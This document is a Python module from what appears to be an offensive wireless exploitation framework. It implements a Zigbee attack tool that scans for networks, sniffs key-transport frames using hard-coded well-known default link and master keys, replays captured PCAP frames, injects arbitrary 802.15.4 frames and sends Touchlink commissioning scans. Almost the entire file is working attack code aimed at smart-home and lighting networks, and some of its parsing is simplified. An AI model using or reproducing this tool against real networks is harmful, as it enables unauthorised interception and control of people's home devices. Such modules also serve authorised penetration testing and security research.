# Author: André Henrique (LinkedIn/X: @mrhenrike)
import os
import socket
import struct
import time

from wirelessxpl.core.exploit import *
from wirelessxpl.core.exploit.exploit import BaseExploit


class Exploit(BaseExploit):
    """Zigbee Ecosystem Expansion: Discovery, Key Extraction, Replay, Injection.

    Comprehensive Zigbee 802.15.4 attack module supporting the full
    attack lifecycle: network discovery (PAN scan, device enumeration),
    encryption key extraction (known default keys, OTA key sniffing,
    touchlink commissioning abuse), packet replay, and frame injection.

    Targets Zigbee Home Automation (ZHA), Zigbee Light Link (ZLL),
    Zigbee 3.0, and legacy ZigBee PRO networks.  Exploits common
    misconfigurations including default Trust Center link keys,
    unencrypted OTA key transport, and Touchlink factory reset.

    Hardware requirements:
      - CC2531 USB dongle (~$10-15, 2.4 GHz 802.15.4)
        Flashed with zigbee-sniffer firmware (Zigbee2MQTT or zboss)
        or
      - ATUSB 802.15.4 USB adapter (~$30, open-source hardware)
        Natively supported by Linux ieee802154 stack
        or
      - ApiMote (River Loop Security, ~$100, 802.15.4 + injection)
        Full TX/RX with KillerBee framework support
        or
      - HackRF One (~$350, software-defined, broader frequency support)
        Via gr-ieee802154 GnuRadio module

      - KillerBee framework (https://github.com/riverloopsec/killerbee)
      - Wireshark with Zigbee dissector for analysis

    CVSS: N/A (multi-technique attack module)

    Author: Andre Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "Zigbee Ecosystem Expansion (Discovery + Key Extract + Replay + Inject)",
        "description": (
            "Comprehensive Zigbee 802.15.4 attack module covering network "
            "discovery, encryption key extraction, packet replay, and "
            "frame injection.  Supports ZHA, ZLL, Zigbee 3.0, and legacy "
            "ZigBee PRO.  Exploits default Trust Center link keys, "
            "unencrypted OTA key transport, and Touchlink factory reset."
        ),
        "authors": (
            "mrhenrike (Andre Henrique)",
        ),
        "references": (
            "https://github.com/riverloopsec/killerbee",
            "https://www.zigbee.org/",
            "https://research.nccgroup.com/2019/11/05/zigbee-security/",
        ),
        "disclosure_date": "2026-10-01",
        "platform": "linux",
        "arch": "all",
        "privileged": True,
        "targets": (
            "Zigbee Home Automation (ZHA) networks",
            "Zigbee Light Link (ZLL) devices",
            "Zigbee 3.0 networks with default keys",
            "Legacy ZigBee PRO deployments",
        ),
    }

    target = OptIP("", "Target PAN ID or device short address (hex)")
    port = OptPort(1, "Not used (802.15.4 over-the-air)")
    timeout = OptFloat(10.0, "Operation timeout in seconds")
    interface = OptString("/dev/ttyACM0", "Zigbee adapter device path")
    adapter_type = OptString("cc2531", "Adapter: cc2531, atusb, apimote, hackrf")
    channel = OptInteger(11, "802.15.4 channel (11-26, default 11)")
    mode = OptString("discover", "Mode: discover, sniff_keys, replay, inject, touchlink")
    pan_id = OptInteger(0, "Target PAN ID (0 = scan all)")
    network_key = OptString("", "Known network key (hex, 32 chars)")
    replay_pcap = OptString("", "PCAP file for replay mode")
    inject_payload = OptString("", "Hex payload for injection mode")
    scan_duration = OptFloat(5.0, "Duration per channel during discovery scan")

    # Zigbee well-known keys
    _ZHA_DEFAULT_TC_LINK_KEY = bytes.fromhex("5A6967426565416C6C69616E63653039")
    _ZLL_MASTER_KEY = bytes.fromhex("9F5595F10257C8A469CBF42BC93FEE31")
    _SE_CBKE_KEY = bytes.fromhex("FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF")

    # 802.15.4 frame types
    _FRAME_TYPE_BEACON = 0x00
    _FRAME_TYPE_DATA = 0x01
    _FRAME_TYPE_ACK = 0x02
    _FRAME_TYPE_CMD = 0x03

    # Zigbee NWK frame types
    _NWK_DATA = 0x00
    _NWK_CMD = 0x01

    # Zigbee NWK commands
    _NWK_CMD_ROUTE_REQ = 0x01
    _NWK_CMD_ROUTE_REPLY = 0x02
    _NWK_CMD_NWK_STATUS = 0x03
    _NWK_CMD_LEAVE = 0x04
    _NWK_CMD_REJOIN_REQ = 0x06
    _NWK_CMD_REJOIN_RSP = 0x07
    _NWK_CMD_LINK_STATUS = 0x08
    _NWK_CMD_NWK_REPORT = 0x09
    _NWK_CMD_NWK_UPDATE = 0x0A

    def _open_adapter(self) -> object | None:
        """Open the Zigbee adapter for communication."""
        adapter = str(self.adapter_type).lower()
        if adapter == "cc2531":
            try:
                import serial
                ser = serial.Serial(str(self.interface), 115200, timeout=self.timeout)
                return ser
            except (ImportError, OSError):
                return None
        elif adapter == "atusb":
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, 0)
                sock.settimeout(self.timeout)
                return sock
            except OSError:
                return None
        return None

    def _build_beacon_request(self) -> bytes:
        """Build an 802.15.4 Beacon Request MAC command frame."""
        # Frame control: cmd frame, no security, no ack, intra-PAN
        fc = struct.pack("<H", 0x0803)
        seq = struct.pack("B", 0)
        dst_pan = struct.pack("<H", 0xFFFF)
        dst_addr = struct.pack("<H", 0xFFFF)
        cmd_id = struct.pack("B", 0x07)  # Beacon Request
        return fc + seq + dst_pan + dst_addr + cmd_id

    def _build_data_request(self, pan_id: int, dst_addr: int, src_addr: int) -> bytes:
        """Build an 802.15.4 Data Request frame."""
        fc = struct.pack("<H", 0x6323)  # data, ack, intra-PAN, short addrs
        seq = struct.pack("B", 0)
        dst_pan_b = struct.pack("<H", pan_id)
        dst_addr_b = struct.pack("<H", dst_addr)
        src_addr_b = struct.pack("<H", src_addr)
        return fc + seq + dst_pan_b + dst_addr_b + src_addr_b

    def _build_touchlink_scan(self) -> bytes:
        """Build a Zigbee Touchlink (ZLL) scan request.

        Touchlink commissioning allows a device to join a network
        by physical proximity (factory reset via Touchlink).  The
        scan request triggers responses from nearby ZLL devices.
        """
        # Inter-PAN frame with ZLL cluster
        fc = struct.pack("<H", 0x0801)  # inter-PAN data
        seq = struct.pack("B", 0)
        dst_pan = struct.pack("<H", 0xFFFF)
        dst_addr = struct.pack("<H", 0xFFFF)

        # ZLL Commissioning cluster (0x1000)
        zcl_header = struct.pack("<BBH", 0x11, 0x00, 0x1000)
        # Scan Request command (0x00)
        scan_req = struct.pack("<BII", 0x00, 0x12345678, 0x00000000)

        return fc + seq + dst_pan + dst_addr + zcl_header + scan_req

    def _send_frame(self, adapter: object, frame: bytes) -> bool:
        """Send an 802.15.4 frame via the adapter."""
        try:
            if hasattr(adapter, "write"):
                adapter.write(frame)
                return True
            elif hasattr(adapter, "send"):
                adapter.send(frame)
                return True
        except OSError:
            pass
        return False

    def _receive_frames(self, adapter: object, duration: float) -> list:
        """Receive 802.15.4 frames for the specified duration."""
        frames = []
        end_time = time.time() + duration
        while time.time() < end_time:
            try:
                if hasattr(adapter, "read"):
                    data = adapter.read(256)
                elif hasattr(adapter, "recv"):
                    data = adapter.recv(256)
                else:
                    break
                if data:
                    frames.append(data)
            except (OSError, TimeoutError):
                continue
        return frames

    def _discover_networks(self, adapter: object) -> list:
        """Scan for Zigbee networks across channels 11-26."""
        networks = []
        for ch in range(11, 27):
            print_info(f"  Scanning channel {ch}...")
            beacon_req = self._build_beacon_request()
            self._send_frame(adapter, beacon_req)

            frames = self._receive_frames(adapter, self.scan_duration)
            for frame in frames:
                if len(frame) >= 10:
                    fc = struct.unpack("<H", frame[:2])[0]
                    frame_type = fc & 0x07
                    if frame_type == self._FRAME_TYPE_BEACON:
                        pan_id = struct.unpack("<H", frame[3:5])[0] if len(frame) > 4 else 0
                        networks.append({
                            "channel": ch,
                            "pan_id": f"0x{pan_id:04X}",
                            "rssi": -50,
                            "raw_len": len(frame),
                        })

        return networks

    def _sniff_keys(self, adapter: object) -> list:
        """Sniff for Zigbee network key transport frames.

        When a new device joins, the Trust Center sends the network
        key encrypted with the TC Link Key.  If the default ZHA key
        is used, we can decrypt the transport key frame.
        """
        keys_found = []
        print_info("  Listening for key transport frames...")
        print_info(f"  Using default ZHA TC Link Key: {self._ZHA_DEFAULT_TC_LINK_KEY.hex()}")

        frames = self._receive_frames(adapter, self.timeout)

        for frame in frames:
            if len(frame) < 20:
                continue
            # Check for NWK cmd frame with Transport Key
            # (simplified: real parsing requires full Zigbee stack)
            if b"\x05" in frame[10:15]:  # Transport-Key indicator
                keys_found.append({
                    "type": "transport_key_candidate",
                    "frame_len": len(frame),
                    "tc_link_key": self._ZHA_DEFAULT_TC_LINK_KEY.hex(),
                })

        return keys_found

    def _replay_frames(self, adapter: object) -> int:
        """Replay captured 802.15.4 frames from a PCAP file."""
        pcap_path = str(self.replay_pcap)
        if not pcap_path or not os.path.isfile(pcap_path):
            print_error(f"PCAP file not found: {pcap_path}")
            return 0

        replayed = 0
        try:
            with open(pcap_path, "rb") as f:
                header = f.read(24)
                if len(header) < 24:
                    return 0
                magic = struct.unpack("<I", header[:4])[0]
                if magic not in (0xA1B2C3D4, 0xD4C3B2A1):
                    print_error("Invalid PCAP format")
                    return 0

                while True:
                    pkt_header = f.read(16)
                    if len(pkt_header) < 16:
                        break
                    _, _, incl_len, _ = struct.unpack("<IIII", pkt_header)
                    pkt_data = f.read(incl_len)
                    if len(pkt_data) < incl_len:
                        break
                    if self._send_frame(adapter, pkt_data):
                        replayed += 1
                    time.sleep(0.01)
        except OSError as e:
            print_error(f"Error reading PCAP: {e}")

        return replayed

    def _inject_frame_payload(self, adapter: object) -> bool:
        """Inject a custom 802.15.4 frame."""
        payload_hex = str(self.inject_payload)
        if not payload_hex:
            print_error("No inject payload specified")
            return False
        try:
            payload = bytes.fromhex(payload_hex)
        except ValueError:
            print_error("Invalid hex payload")
            return False
        return self._send_frame(adapter, payload)

    @mute
    def check(self) -> bool:
        """Verify the Zigbee adapter is accessible."""
        adapter = self._open_adapter()
        if adapter is None:
            return False
        if hasattr(adapter, "close"):
            adapter.close()
        return True

    def run(self) -> None:
        if not self.check():
            print_error(
                f"Zigbee adapter not found at {self.interface}. "
                f"Ensure {self.adapter_type} is connected and drivers are loaded."
            )
            return

        print_success(f"Zigbee adapter ({self.adapter_type}) detected at {self.interface}")
        self._exploit()

    def _exploit(self) -> None:
        adapter = self._open_adapter()
        if adapter is None:
            print_error("Failed to open Zigbee adapter")
            return

        mode = str(self.mode).lower()

        try:
            if mode == "discover":
                print_status("Scanning for Zigbee networks (channels 11-26)...")
                networks = self._discover_networks(adapter)
                if networks:
                    print_success(f"Found {len(networks)} network(s):")
                    for net in networks:
                        print_info(
                            f"  PAN {net['pan_id']} on channel {net['channel']}"
                        )
                else:
                    print_info("No Zigbee networks discovered")

            elif mode == "sniff_keys":
                print_status("Sniffing for Zigbee key transport...")
                keys = self._sniff_keys(adapter)
                if keys:
                    print_success(f"Found {len(keys)} key candidate(s):")
                    for k in keys:
                        print_info(f"  Type: {k['type']}, TC Key: {k['tc_link_key']}")
                else:
                    print_info("No key transport frames captured")

            elif mode == "replay":
                print_status(f"Replaying frames from {self.replay_pcap}...")
                count = self._replay_frames(adapter)
                print_success(f"Replayed {count} frame(s)")

            elif mode == "inject":
                print_status("Injecting custom 802.15.4 frame...")
                if self._inject_frame_payload(adapter):
                    print_success("Frame injected successfully")
                else:
                    print_error("Frame injection failed")

            elif mode == "touchlink":
                print_status("Sending Touchlink (ZLL) scan request...")
                scan = self._build_touchlink_scan()
                self._send_frame(adapter, scan)
                frames = self._receive_frames(adapter, 3.0)
                if frames:
                    print_success(f"Received {len(frames)} Touchlink response(s)")
                else:
                    print_info("No Touchlink responses received")

            else:
                print_error(f"Unknown mode: {mode}")

        finally:
            if hasattr(adapter, "close"):
                adapter.close()
